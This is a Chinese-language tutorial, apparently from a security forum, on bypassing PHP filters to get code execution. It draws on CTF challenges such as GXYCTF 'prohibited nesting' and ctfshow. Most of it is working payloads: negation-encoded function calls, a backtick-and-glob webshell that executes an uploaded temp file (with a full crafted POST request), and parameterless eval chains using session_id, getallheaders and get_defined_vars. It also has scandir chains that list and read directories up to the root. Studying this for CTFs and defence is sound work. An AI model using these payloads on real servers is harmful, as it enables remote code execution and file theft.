P牛的另一篇文章：

在 PHP 7 中修改了表达式执行的顺序：

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ff6d85c686cd857c0e0cc5f762352e97b2d5ac1c.png)

PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过`('phpinfo')();`来执行函数，第一个括号中可以是任意PHP表达式。

所以很简单了，构造一个可以生成`phpinfo`这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：

```php
(~%8F%97%8F%96%91%99%90)();
```

也就是刚刚的取反，以及其他位运算

**PHP5**

大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。

PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？

因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、`$`的系统命令来getshell？

此时我想到了两个有趣的Linux shell知识点：

1. shell下可以利用`.`来**执行任意脚本**
2. Linux**文件名支持用glob通配符代替**

**`. file`的意思就是用bash执行file文件中的命令，是不需要file有x权限的。**

那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？

这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

第二个难题接踵而至，执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：

- `*`可以代替0个及以上任意字符
- `?`可以代表1个任意字符

那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`，但是要知道这样的文件有很多，我们怎么样才能选到我们上传的那个文件呢。

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-87f9c1ed40f4aabbcee5612c363092e27dd7940f.png)

大部分同学对于通配符，可能知道的都只有`*`和`?`。但实际上，阅读Linux的文档（ <http://man7.org/linux/man-pages/man7/glob.7.html> ），可以学到更多有趣的知识点。

其中，glob支持用`[^x]`的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉`/bin/run-parts`，以及带`.`的两个。

```php
/???/???[^-][^.][^.]?[^.]?
```

现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了

继续研究通配符，跟正则表达式类似，glob支持利用`[0-9]`来表示一个范围。

所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。

翻开**ascii码表**，可见大写字母位于`@`与`[`之间，那么，我们可以利用`[@-[]`来表示大写字母：

上面的几种过滤也不需要了，我们只有这一个文件是最后以大写字母结尾的，临时文件的生成是随机的，多试几次就可以得到最后一个字母是大写的文件了。

```php
/???/????????[@-[]
```

综合一下，我们的payload就职这样的

```php
?><?= `. /???/????????[@-[]`?>
```

上传表单我们可以通过抓包后进行修改得到，payload

```php
POST /?shell=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]`%3b?>  HTTP/1.1
Host: xxx.xxx.xxx.xxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:multipart/form-data;boundary=--------123
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 109

----------123
Content-Disposition:form-data;name="file";filename="1.txt"

#!/bin/sh
ls /
----------123--
```

### 无参数RCE

这里有道例题，就是\[GXYCTF2019\]禁止套娃

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
eval($_GET['code']);
}
preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)
pre_match('/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i', $code))
```

对两个正则进行一下分析：

1. preg\_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。  
    再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）
2. preg\_match 的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。

说白了就是传入的参数不能含有参数

```php
scandir（'a()'）//可以使用，里面没有参数
scandir（'123'）//不可以使用，里面有参数
```

那么这个时候，我们要怎么样进行绕过呢？

#### 利用session\_id

利用`http headers`传参，然而`http`中有那么多的内容，最容易想到的估计就是`cookies`传递参数。  
在php中有一个函数`session_id`可以用来获取/设置当前会话ID，并且这个值是我们可控的。但是它的使用有些限制： 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 ，但是这并不影响我们操作。我们可以使用十六进制传入，之后使用`hex2bin()`函数转换即可。但是使用`session_id`的时候必须要开启`session`才可以，需要`session_start`

```php
?code=eval(hex2bin(session_id(session_start())));
```

算一下十六进制，`hex("phpinfo();")=706870696e666f28293b`，然后在cookie中传入PHPSESSID

#### 利用get\_defined\_vars ()函数

`get_defined_vars()`：返回**由所有已定义变量所组成的数组**

我们通过`get`或者`post`方法，传入的参数，以及它的值可以被`get_defined_vars()`读出来。而且它返回的还是数组，那么我们可以通过php中的一系列对数组操作的函数来得到我们想要的值。

```php
end() - 将内部指针指向数组中的最后一个元素，并输出。
next() - 将内部指针指向数组中的下一个元素，并输出。
prev() - 将内部指针指向数组中的上一个元素，并输出。
reset() - 将内部指针指向数组中的第一个元素，并输出。
each() - 返回当前元素的键名和键值，并将内部指针向前移动。
current() -输出数组中的当前元素的值。
```

构造payload

```php
?code=print_r(current(get_defined_vars()));&b=phpinfo();
```

查看最后一个数组，且eval

```php
?code=eval(end(current(get_defined_vars())));&b=phpinfo();
```

#### 利用getallheaders()

`getallheaders`返回当前请求的所有请求头信息，那么我们可以把需要执行的参数写进请求头里，随意一个参数都可以，之后就可用数组操作的函数拿出来写入的参数并且执行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9662bc5d5a6a5bc6a44e425bb8a84364b68e6d97.png)

像这样

细心的朋友肯定会发现，这里有两个`eval`函数，这里需要两个`eval`的原因，我认为是，如果只有一个`eval`就只是执行 `end(getallheaders());` 获取了其返回值，但是并没有执行其返回值，再加一个`eval` ，也就是获取了返回值后，再`eval()`。

#### getenv()

`getenv()`：获取环境变量的值(在PHP7.1之后可以不给予参数)

**getenv() 获取一个环境变量的值，phpinfo() 获取全部的环境变量，其实不是很理解，直接phpinfo()就好了。**

```php
var_dump(getenv(phpinfo()));
```

#### scandir()

这种方法是使用比较多的，相对而言比较多变，各个函数相辅相成。

```php
scandir()  //函数返回指定目录中的文件和目录的数组。
localeconv()   //返回一包含本地数字及货币格式信息的数组。
current()     //返回数组中的单元，默认取第一个值。
pos是current的别名
getcwd()      //取得当前工作目录
dirname()     //函数返回路径中的目录部分。
array_flip()  //交换数组中的键和值，成功时返回交换后的数组
array_rand()  //从数组中随机取出一个或多个单元
//array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
//dirname(chdir(dirname()))配合切换文件路径
//current(localeconv())表示.
```

示例：

```php
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件
if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件
```

##### phpversion()获取 .

- `phpversion()`返回php版本，如`7.3.5`
- `floor(phpversion())`返回`7`
- `sqrt(floor(phpversion()))`返回`2.6457513110646`
- `tan(floor(sqrt(floor(phpversion()))))`返回`-2.1850398632615`
- `cosh(tan(floor(sqrt(floor(phpversion())))))`返回`4.5017381103491`
- `sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))`返回`45.081318677156`
- `ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))`返回`46`
- `chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`返回`.`
- `var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))`扫描当前目录
- `next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))`返回`..`
    
    **floor()** ：舍去法取整， **sqrt()** ：平方根， **tan()** ：正切值， **cosh()** ：双曲余弦， **sinh()** ：双曲正弦， **ceil()** ：进一法取整

```php
chr(ord(hebrevc(crypt(phpversion())))) 返回 .
```

- `hebrevc(crypt(arg))`可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符 
    - `crypt()` ：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。
    - `hebrevc()` ：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。

### 奇怪的绕过

#### 用各种括号和$打出数字

这里是ctfshow的57关学到的

`${_}`:代表上一次命令执行的结果  
`$(())`: 做运算

`${_}=""` 如果没做过任何操作的话就是这个=  
`$((${_}))=0`  
`$((~$((${_}))))=-1`

![image.png](https://b3logfile.com/siyuan/1621238442570/assets/image-20211027143512-1wcujz5.png)

然后靠堆这个拼凑出一个负数，然后取反，就能得到一个任意数字

总结：
---

**绕过是门学问，要对PHP语言有足够的理解，对各种函数熟练的应用，当然很多的师傅都走在了前面，我们要做的就是把这些整理、归纳好，好好学习研究，争取能自己想到一下新的姿势。**

**参考自：**

[https://blog.csdn.net/qq\_45521281/article/details/105585709?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_45521281/article/details/105585709?spm=1001.2014.3001.5501)

<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html>

<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>

<https://www.cnblogs.com/-qing-/p/10816089.html>

<https://xz.aliyun.com/t/10212>

<https://xz.aliyun.com/t/9360#toc-6>

<https://www.freebuf.com/articles/network/279563.html>